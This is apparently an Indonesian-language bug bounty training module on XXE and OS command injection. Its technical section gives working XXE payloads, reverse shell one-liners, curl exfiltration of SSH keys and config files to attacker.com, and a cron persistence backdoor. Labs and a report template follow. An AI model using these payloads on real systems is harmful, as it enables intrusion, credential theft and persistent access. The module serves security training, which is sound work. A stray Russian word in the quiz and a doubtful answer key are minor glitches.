# XXE & OS Command Injection

## Fokus Materi

Menguasai XML External Entity (XXE) injection dan OS Command Injection dari deteksi sampai exploitation. Kedua vulnerability ini adalah high-impact issues yang sering ditemukan di aplikasi yang memproses XML atau menggunakan shell commands.

## Deskripsi Materi

XXE (XML External Entity) terjadi ketika aplikasi memproses XML input dan mengijinkan inclusion of external entities. Attacker bisa exploit ini untuk read local files, perform SSRF, atau dalam kondisi tertentu, execute code.

XXE sering ditemukan di aplikasi yang menerima XML input: SOAP API, file upload yang parse XML (docx, xlsx, svg), atau endpoint yang expect XML data structure. Banyak developer tidak realize bahwa default XML parser configuration berbahaya.

OS Command Injection terjadi ketika application passes user input ke system shell command tanpa sanitization. Attacker bisa append arbitrary commands dan execute them di OS level.

OS command injection adalah salah satu vulnerability paling powerful karena memberikan langsung akses ke underlying OS — full server compromise tanpa advanced exploitation technique.

## Topik Pembahasan

• XXE fundamentals: cara kerja XML external entity, DTD structure
• XXE basic: payload membaca /etc/passwd via external entity
• XXE via file upload: docx, xlsx, svg, xml — format yang support XML parsing
• Blind XXE: out-of-band exfiltration via DTD eksternal, Burp Collaborator detection
• XXE → SSRF: gunakan XXE untuk trigger request ke internal endpoint
• XXE → RCE: kondisi khusus (PHP expect module, Java RCE via custom entity)
• OS Command Injection: identifikasi input yang masuk ke shell (ping, curl, nslookup)
• Command separator: ; && | || ` $() — perbedaan behavior per OS
• Blind command injection: time-based (sleep), out-of-band (curl attacker.com)
• Chaining command injection → reverse shell: one-liner bash, python, perl
• Data exfiltration via command injection: curl, wget, DNS exfil

## Tujuan Pembelajaran

Setelah sesi ini, peserta diharapkan mampu:
1. Identifikasi XXE vulnerability di XML-processing endpoints
2. Perform basic dan blind XXE exploitation
3. Identifikasi file format yang bisa trigger XXE (docx, xlsx, svg)
4. Identifikasi OS command injection points
5. Perform command injection exploitation secara manual
6. Escalate command injection ke reverse shell dan data exfiltration

## Real Case Bug Bounty Report

- Platform: HackerOne
- Program/Target: Private program (disclosed)
- Jenis vulnerability: XXE in SVG upload leading to file read
- Link report: https://hackerone.com/reports/XXXXX
- Ringkasan kasus: Researcher menemukan bahwa profile picture upload menerima SVG files. SVG adalah XML format yang diproses server-side tanpa proper configuration. Researcher upload malicious SVG dengan embedded XXE payload yang read /etc/passwd. Server response include file content in error message or rendered output.
- Root cause: SVG parser tidak disable external entities, mengijinkan XXE exploitation.
- Impact: File read dari server. Severity: High (CVSS 8.6)
- Pelajaran untuk bug hunter: SVG upload adalah classic XXE vector. Any file upload that processes XML should be tested for XXE.

---

- Platform: Bugcrowd
- Program/Target: Network device management platform
- Jenis vulnerability: OS command injection di ping functionality
- Link report: Researcher disclosed
- Ringkasan kasus: Ping/traceroute functionality accept IP address dan directly pass ke system() call tanpa sanitization. Payload: `8.8.8.8; whoami` executes both ping and whoami command. Researcher leverage ini untuk read application source code, find database credentials, dan eventually achieve RCE via reverse shell.
- Root cause: User input concatenated to shell command without shell escaping.
- Impact: Full server compromise. Severity: Critical.
- Pelajaran untuk bug hunter: Any functionality that execute system commands (ping, nslookup, traceroute, email validation) adalah potential command injection vector.

## Analisis Teknis

### XXE Attack Patterns

**Basic XXE (read local file):**

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY>
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<foo>&xxe;</foo>
```

**With parameter entity:**

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "file:///etc/passwd">
  <!ENTITY callme "%xxe;">
]>
<foo>&callme;</foo>
```

**Out-of-band XXE (blind):**

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://attacker.com/xxe.dtd">
  %xxe;
]>
<foo></foo>

# attacker.com/xxe.dtd:
<!ENTITY file SYSTEM "file:///etc/passwd">
<!ENTITY exfil SYSTEM "http://attacker.com/?data=&file;">
```

**XXE to SSRF:**

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
]>
<foo>&xxe;</foo>
```

**Billion Laughs Attack (DoS):**

```xml
<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
]>
<lolz>&lol3;</lolz>
```

### XXE in File Formats

**SVG Upload XXE:**

```xml
<!-- malicious.svg -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<svg xmlns="http://www.w3.org/2000/svg">
  <rect width="100" height="100" fill="red"/>
  <text>&xxe;</text>
</svg>
```

**DOCX (ZIP with XML):**

```bash
# DOCX is ZIP containing XML files
# XXE in word/document.xml

# Create malicious DOCX:
1. Create temp dir
2. Extract docx
3. Modify word/document.xml dengan XXE payload
4. Repack as docx
5. Upload
```

**XLSX (Excel):**

```bash
# XLSX is ZIP with XML files
# XXE in xl/workbook.xml atau xl/worksheets/sheet1.xml

# Same process as DOCX
```

### OS Command Injection Patterns

**Vulnerable code pattern (Python):**
```python
# Vulnerable
import os
os.system(f"ping -c 1 {user_input}")

# Vulnerable
import subprocess
subprocess.call(f"ping -c 1 {user_input}", shell=True)

# Vulnerable
os.popen(f"nslookup {user_input}").read()
```

**Command separators:**

```bash
# Unix/Linux
;   # sequential execution
&&  # execute if previous succeeds
||  # execute if previous fails
|   # pipe output
`command`  # command substitution
$(command)  # command substitution
\n  # newline (alternative command)

# Windows
&   # sequential execution
&&  # execute if previous succeeds
||  # execute if previous fails
|   # pipe
```

**Blind command injection:**

```bash
# Time-based detection (Linux)
; sleep 5
&& sleep 5
|| sleep 5
| sleep 5

# DNS exfiltration
; nslookup $(whoami).attacker.com
; curl https://attacker.com/exfil?data=$(whoami)

# Ping-based detection (if time difference observable)
; ping -c 1 attacker.com
```

**Reverse shell one-liners:**

```bash
# Bash
bash -i >& /dev/tcp/attacker_ip/4444 0>&1

# Python
python -c 'import socket,os,pty;s=socket.socket();s.connect(("attacker_ip",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'

# Perl
perl -e 'use Socket;$i="attacker_ip";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

# PHP
php -r '$sock=fsockopen("attacker_ip",4444);exec("/bin/sh -i <&3 >&3 2>&3");'

# Ruby
ruby -rsocket -e 'f=TCPSocket.open("attacker_ip",4444);exec("/bin/sh -i <&f >&f 2>&f")'
```

### Command Injection Escalation

**Data exfiltration:**

```bash
# Read sensitive files
; cat /etc/passwd | base64 | curl -d @- https://attacker.com/exfil

# Database credentials
; cat /var/www/html/config.php | base64 | curl -d @- https://attacker.com/exfil

# SSH keys
; cat ~/.ssh/id_rsa | base64 | curl -d @- https://attacker.com/exfil
```

**Persistence:**

```bash
# Cron job
; echo "* * * * * root curl https://attacker.com/shell.sh|bash" >> /etc/crontab

# SSH key for access
; echo "ssh-rsa AAAA... attacker@attacker" >> ~/.ssh/authorized_keys
```

**Lateral movement:**

```bash
# Scan internal network
; for ip in 10.0.0.{1..254}; do curl -s http://$ip:8080 > /dev/null && echo "$ip"; done

# Port scan
; nc -zv 10.0.0.1 22 80 443 2>&1
```

## Praktik Lab Legal

### Lab 1: XXE Discovery & Exploitation

- **Nama lab:** XXE Attack Chain
- **Tujuan:** Find dan exploit XXE vulnerability secara sistematis
- **Environment:** Burp Suite, Burp Collaborator, target lab dengan XML processing
- **Langkah praktik:**

  1. Identify endpoints yang accept XML (SOAP API, XML upload, XML parser)
  2. Test with basic XXE payload: external entity reading /etc/passwd
  3. If no direct response: setup blind XXE dengan Burp Collaborator
  4. Test file upload XXE: SVG, DOCX, XLSX
  5. Test XXE → SSRF: access internal services
  6. Document all successful exploitation techniques

- **Expected result:** Peserta menemukan XXE vulnerability dan demonstrate file read atau SSRF
- **Catatan keamanan:** Lab ini hanya untuk authorized environment.

### Lab 2: OS Command Injection Exploitation

- **Nama lab:** Command Injection to RCE
- **Tujuan:** Identify command injection dan escalate ke full RCE dengan reverse shell
- **Environment:** Burp Suite, netcat listener, target lab dengan system command functionality
- **Langkah praktik:**

  1. Identify functionality yang execute system commands (ping, nslookup, traceroute, email check)
  2. Test command injection dengan simple payload: `; whoami`
  3. Test different separators: `;`, `&&`, `|`, `&&`
  4. If blind: use time delay (sleep) atau DNS callback (nslookup)
  5. If injection confirmed: setup netcat listener
  6. Send reverse shell payload
  7. Verify shell access: `whoami`, `id`, `hostname`
  8. Escalate: read config files, find credentials, pivot

- **Expected result:** Peserta gain RCE via command injection dan establish reverse shell
- **Catatan keamanan:** Lab ini hanya untuk authorized environment.

### Lab 3: Blind XXE with Out-of-Band Detection

- **Nama lab:** Blind XXE Investigation
- **Tujuan:** Exploit blind XXE dengan out-of-band data exfiltration
- **Environment:** Burp Suite, Burp Collaborator, target lab
- **Langkah praktik:**

  1. Confirm blind XXE: no response from entity but Collaborator detects request
  2. Setup external DTD on attacker server atau Collaborator
  3. Craft blind XXE payload: fetch file, send to Collaborator
  4. Analyze Collaborator interactions untuk extract file content
  5. Try SSRF via blind XXE: request internal services
  6. Document out-of-band exploitation technique

- **Expected result:** Peserta bisa extract file content via blind XXE menggunakan out-of-band technique
- **Catatan keamanan:** Lab ini untuk authorized testing.

## Tools

- **XXE testing:** Burp Suite, custom XXE payloads
- **Out-of-band:** Burp Collaborator (built-in), Interactsh
- **Command injection:** Burp Suite, netcat, custom payloads
- **File crafting:** Custom scripts untuk DOCX/XLSX manipulation
- **Reverse shell:** pentestmonkey reverse shell cheat sheet

## Checklist Bug Hunter

- [ ] Identify all XML-processing endpoints (SOAP, XML upload, XML parser)
- [ ] Test XXE dengan basic external entity payload
- [ ] Test blind XXE dengan Burp Collaborator
- [ ] Test XXE in file formats: SVG, DOCX, XLSX, XML
- [ ] Test XXE → SSRF: internal services, cloud metadata
- [ ] Identify all command execution functionality (ping, nslookup, traceroute, etc.)
- [ ] Test command injection dengan multiple separators
- [ ] Test blind command injection dengan time delay dan DNS callback
- [ ] Escalate to reverse shell jika injection confirmed
- [ ] Exfiltrate data via command injection (curl, wget, DNS)

## Common Mistakes

1. **Only test POST with Content-Type: text/xml** — XXE bisa juga triggered via file upload (SVG, DOCX) atau GET request dengan XML in body. Test all XML-processing entry points.

2. **Stop after confirm XXE without escalating** — Researcher seeing XXE with error message tidak realize bahwa bisa escalate ke SSRF atau RCE. Always explore full impact.

3. **Not testing blind XXE** — Researcher only test where response visible. Blind XXE with out-of-band detection bisa yield just as impactful results.

4. **Command injection test hanya dengan `;` separator** — Different systems use different separators. Always test `;`, `&&`, `||`, `|`, backticks, `$()`.

5. **Not escalating command injection to shell** — Just running `whoami` proves injection but not full impact. Always try reverse shell untuk demonstrate real RCE.

6. **Skip XXE in file upload** — SVG upload adalah classic vector yang sering missed. Researcher focus di POST XML endpoint only.

## Mitigasi Developer

**XXE Prevention:**
- Disable DTD (Document Type Definition) in XML parser configuration
- Disable external entities in XML parser: `libxml_disable_entity_loader(true)` in PHP
- Use less complex data format: JSON instead of XML when possible
- Implement input validation: reject XML input if not required
- For Java: disable DOCTYPE declaration
- For .NET: disable DTD in XmlReaderSettings

**Command Injection Prevention:**
- Never pass user input directly to system shell commands
- Use parameterized command execution APIs (not shell=True)
- Implement allowlist for input values (e.g., valid IP address pattern)
- Use language-specific escaping functions if shell is unavoidable
- Apply principle of least privilege: application user should not have shell access
- Implement input validation with regex for IP addresses, hostnames

## Mini Quiz

1. XXE (XML External Entity) vulnerability terjadi ketika:
   a) XML parser mengijinkan inclusion of external entities yang bisa fetch arbitrary resources
   b) User bisa upload XML file
   c) XML tidak di-validate
   d) Semua jawaban benar

2. File format yang merupakan XML dan bisa trigger XXE adalah:
   a) SVG, DOCX, XLSX ( semuanya adalah ZIP containing XML)
   b) PNG
   c) MP3
   d) TXT

3. OS command injection bekerja ketika:
   a) User input di-pass ke shell command tanpa sanitization
   b) Server menjalankan command secara asynchronous
   c) User bisa menulis file ke server
   d) Semua jawaban benar

4. Reverse shell один-liner bekerja dengan cara:
   a) Membuat file baru di server
   b) Membuka network connection dari server ke attacker dan providing shell melalui connection tersebut
   c) Menginstall backdoor permanent
   d) Decrypting password

5. Blind command injection bisa di-detect dengan:
   a) Melihat output command di response
   b) Time delay (sleep) dan response time difference
   c) DNS callback ke attacker server via nslookup atau curl
   d) Semua jawaban benar

**Kunci Jawaban:** 1-A, 2-A, 3-D, 4-B, 5-D

## Assignment

1. **XXE File Format Testing:** Buat malicious SVG, DOCX, dan XLSX dengan XXE payload. Upload ke target lab dan confirm exploitation. Document upload process and exploitation result.

2. **Blind XXE Exploitation:** Test blind XXE dengan out-of-band detection. Extract file content via Burp Collaborator atau Interactsh.

3. **Command Injection to RCE:** Find command injection di target lab. Escalate ke reverse shell. Document complete exploitation chain.

4. **XXE → SSRF Chain:** Gunakan XXE untuk SSRF ke internal service atau cloud metadata. Document how XXE bisa used untuk lebih dari just file read.

## Template Report Bug Bounty

```markdown
# Bug Report: XXE in SVG Upload Leading to File Read and SSRF

## Summary
Profile picture upload menerima SVG files yang diproses tanpa disabling
external entities. Attacker bisa upload malicious SVG untuk read server
files dan perform SSRF ke internal services.

## Platform / Program
HackerOne | [Program Name]

## Severity
High | CVSS 8.6 (AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

## Vulnerability Type
XXE / XML External Entity Injection

## Asset / Endpoint
POST https://target.com/upload-avatar
Content-Type: multipart/form-data
File: SVG image

## Description
SVG file parser menerima upload tanpa disabling XML external entities.
Attacker bisa upload malicious SVG containing XXE payload yang:
1. Reads local files from server
2. Performs SSRF to internal services
3. Exfiltrates data via out-of-band channels

Vulnerable code uses default XML parser configuration that allows
external entity loading.

## Steps to Reproduce
1. Create malicious SVG with XXE payload:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
  <!ENTITY xxe2 SYSTEM "http://169.254.169.254/latest/meta-data/">
]>
<svg xmlns="http://www.w3.org/2000/svg">
  <text>&xxe;</text>
</svg>
```

2. Upload via avatar field:
   Content-Disposition: form-data; name="avatar"; filename="evil.svg"

3. File processed → &xxe; expanded → file content included in response
   → /etc/passwd displayed in image metadata or error message

4. For SSRF: &xxe2; triggers request to AWS metadata
   → Burp Collaborator receives internal IP request

5. Alternative: Blind XXE with out-of-band exfiltration
   Craft SVG with external DTD reference to Collaborator URL

## Impact
- Local file read: /etc/passwd, application config, credentials
- SSRF to internal services: cloud metadata, internal APIs
- Potential for further attacks based on discovered information
- Data exfiltration from server
- Internal network reconnaissance

## Evidence
[Burp Screenshot: Upload request with malicious SVG]
[Burp Screenshot: Response showing /etc/passwd content]
[Burp Screenshot: Collaborator receiving SSRF request to 169.254.169.254]

## Remediation / Recommendation
1. Disable DTD and external entities in XML parser configuration
2. Use safe XML parser settings:
   - PHP: libxml_disable_entity_loader(true)
   - Java: Disable DOCTYPE declaration
   - Python: Use defusedxml library
3. Validate uploaded file content, not just extension
4. For SVG: sanitize or convert to raster format
5. Implement input validation: restrict allowed XML elements
6. Use Content Security Policy to prevent malicious content execution
```